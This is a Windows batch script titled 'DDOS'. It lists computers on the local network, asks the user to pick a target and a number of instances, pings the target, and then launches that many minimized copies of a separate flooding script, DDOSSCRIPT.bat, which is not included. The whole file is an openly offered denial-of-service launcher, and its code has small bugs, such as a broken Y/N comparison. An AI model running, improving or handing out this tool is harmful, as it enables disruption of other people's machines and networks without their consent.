@echo off
title DDOS
echo ___________________________
echo Program by X̍ͭ́҉̦͓ 
echo ___________________________
echo Loading Comps...
net view
set INPUT=
set /P INPUT="Choose a comp. >"
set /P OPENNUM="Put in the number of apps. >"
cls
echo Scanning adress for authenticity
echo %INPUT% > COMPID.txt
ping %INPUT% > nul
IF ERRORLEVEL 1 (
color 4F
echo It appears that that ip is invalid.
echo Press any key to exit
pause > nul
exit
)
cls
echo Ip is valid. Loading subscripts... [Note: Subscripts begin minimized. To stop DDOS, close out of all subscripts.]
for /L %%a in (1,1,%OPENNUM%) do (
Start /min DDOSSCRIPT.bat
)
cls
IF ERRORLEVEL 1 (
color 40
echo ERROR
echo Press any key to exit
pause > nul
exit
)
pause
cls
Color 2F
echo %OPENNUM% subscripts sucessfully created! [Note: Subscripts begin minimized. To stop DDOS, close out of all subscripts.]
:finalloop
echo Press any key to exit out of this and all subscripts.
pause >nul
set /P INPUT="Are you sure? Y/N >"
if INPUT == N goto :finalloop
taskkill /IM cmd.exe /FI "WINDOWTITLE eq SUBSCRIPT*" > null
goto end 
:end